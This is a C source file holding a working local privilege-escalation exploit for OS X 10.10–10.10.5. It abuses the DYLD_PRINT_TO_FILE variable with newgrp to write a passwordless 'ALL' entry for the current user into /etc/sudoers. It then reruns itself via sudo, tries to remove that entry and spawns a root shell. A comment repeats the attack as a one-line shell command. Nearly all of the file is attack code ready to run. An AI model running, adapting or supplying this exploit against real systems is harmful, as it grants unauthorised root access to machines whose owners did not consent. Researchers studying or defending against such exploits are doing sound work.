//
//  main.c
//  dyld-print-to-file-exploit
//
//  Created by tihmstar on 11.12.15.
//  Copyright (c) 2015 tihmstar. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int strEndsWith(char *string, char *endswith){
    for (int i=0; i<strlen(endswith); i++) {
        if (string[strlen(string)-1 - i] != endswith[strlen(endswith)-1 -i]) {
            return 0;
        }
    }
    return 1;
}

int main(int argc, const char * argv[]) {
    if (getuid() == 0) {
        printf("[*] cleaning up\n");
        
        FILE *sudoers = fopen("/etc/sudoers", "r+");
        char buf[1024];
        
        if (!sudoers) {
            printf("[!] error opening /etc/sudoers failed!\nAre we root and does the file exist?\n");
            buf[0] = ' ';
        }else{
            while( fgets(buf, 1024, sudoers) !=NULL );
        }
        
        buf[strlen(buf)-1] = '\0'; //remove \n\n char
        if (strEndsWith(buf, " ALL=(ALL) NOPASSWD:ALL")) {
            size_t oldsize = ftell(sudoers);
            ftruncate(fileno(sudoers), oldsize - (strlen(buf)+1));
        }else{
            printf("[!] error cleaning up failed!\nPlease clean /etc/sudoers yourself\n");
        }
        fclose(sudoers);
        printf("[*] spawning root shell\n");
        
        system("sh");
        return 0;
    }else if (argc >= 2 && strncmp(argv[1],"exp", strlen("exp")) == 0){
        printf("[!] exploit failed!\n");
        return 1;
    }
    printf("This exploits OSX 10.10 - 10.10.5\n");
    //echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
    printf("[*] getting account name\n");
    char *user = getenv("LOGNAME");
    
    
    
    char cmdbuf[] = "echo 'echo \"%s ALL=(ALL) NOPASSWD:ALL\">&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp";
    size_t cmdSize = strlen(cmdbuf) + strlen(user);
    char *cmd = malloc(cmdSize + 1);
    memset(cmd,0,cmdSize+1);
    
    snprintf(cmd, cmdSize, cmdbuf,user);
    printf("[*] modifying sudoers\n");
    system(cmd);
    
    printf("[*] executing stage 2\n");
    if (strlen(argv[0]) + strlen("sudo ") > cmdSize) {
        free(cmd);
        cmdSize = strlen(argv[0]) + strlen("sudo ");
        cmd = malloc(cmdSize+1);
        memset(cmd,0,cmdSize+1);
    }
    memset(cmd, 0, cmdSize);
    snprintf(cmd, 0x500, "sudo %s exp",argv[0]);
    system(cmd);
    
    free(cmd);
    return 0;
}
